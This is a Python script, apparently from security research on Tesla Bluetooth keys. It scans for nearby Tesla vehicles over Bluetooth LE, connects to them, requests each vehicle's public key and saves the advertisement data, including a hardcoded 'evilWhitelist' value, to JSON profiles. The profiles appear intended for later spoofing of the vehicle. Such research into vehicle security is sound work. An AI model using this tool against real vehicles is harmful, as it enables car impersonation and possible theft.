#!/usr/bin/env python3

__author__ = "Martin Herfurt (trifinite.org)"
__version__ = "0.1.0"
__license__ = "MIT"


import asyncio
import argparse
import pyfiglet
import hashlib
import json
from bleak import discover, BleakClient

pubkeyResponse = ""
TeslaBeaconUUID =           "74278BDA-B644-4520-8F0C-720EAF059935"
TeslaServiceUUID =          "00000211-B2D1-43F0-9B88-960CEBF8B91E"
TeslaToVehicleCharUUID =    "00000212-B2D1-43F0-9B88-960CEBF8B91E"
TeslaFromVehicleCharUUID =  "00000213-B2D1-43F0-9B88-960CEBF8B91E"

def getHexString(messageBytes):
    return ''.join(format(x, '02x') for x in messageBytes)

async def notification_handler(sender, data):
    response = getHexString(data)
    if (response.startswith('004')):
        global pubkeyResponse
        pubkeyResponse = response

async def run():
    devices = await discover()
    for d in devices:
        if (len(d.name)==18 and d.name.startswith('S'+vin_ident)):
            array = d.metadata['manufacturer_data'][76]
            eir = '0201061aff4c00'+''.join(format(x, '02x') for x in array)
            profile = {
                'vehicleIdentifier': d.name,
                'vehicleBluetoothAddress': d.address,
                'scanExtendedInquiryResponse': eir,
                'scanResponse': '030222111309536233313764363338666563393432646143',
                'evilWhitelist': '001f82011c080312060a042486826412060a04536019fd12060a041af18d6e1807',
            }
            
            # get vehicles pubkey
            # establish connection to vehicle
            client = BleakClient(d.address)
            print("connecting to "+d.address)            
            try:
                await client.connect(timeout=5.0)
                await asyncio.sleep(1.0)
            except Exception as e:
                print("ERROR: Failed to connect to vehicle!")
                print(e)
                exit()
        
            # subscribe to characteristic
            try:
                await client.start_notify(TeslaFromVehicleCharUUID, notification_handler)
                await asyncio.sleep(1.0)
            except Exception as e:
                print("ERROR: Failed to subscribe to 'From Vehicle' characteristic!")
                print(e)
                exit()

            pubkeyRequestBytes = bytes.fromhex("12040a020803")
            await client.write_gatt_char(TeslaToVehicleCharUUID, pubkeyRequestBytes, False)             
            await asyncio.sleep(3.0)

            profile['vehiclePubkeyResponse'] = pubkeyResponse

            if (len(args.vin)==17):
                profile['vehicleVIN'] = args.vin.upper()

            await client.disconnect()

            print("writing file "+d.name+".json")
            json_object = json.dumps(profile, indent=4)
            with open(d.name+".json", "w") as outfile:
                outfile.write(json_object)


parser = argparse.ArgumentParser()
# Optional positional argument
parser.add_argument("--vin", help="VIN number of the vehicle to filter", required=False)
# Specify output of "--version"
parser.add_argument("--version", action="version", version="%(prog)s (version {version})".format(version=__version__))

args = parser.parse_args()

ascii_banner = pyfiglet.figlet_format("temparary\nprofiler")
print(ascii_banner)
print("Author:  "+__author__)
print("Version: "+__version__+"\n")


args = parser.parse_args()
if (len(args.vin)==17):
    vin = args.vin
    filterVIN = vin.upper()
    b = bytes(filterVIN, 'utf-8')
    hash_object = hashlib.sha1(b)
    vin_ident = hash_object.hexdigest()[0:16]
else:
    vin_ident = ''

loop = asyncio.get_event_loop()
loop.run_until_complete(run())
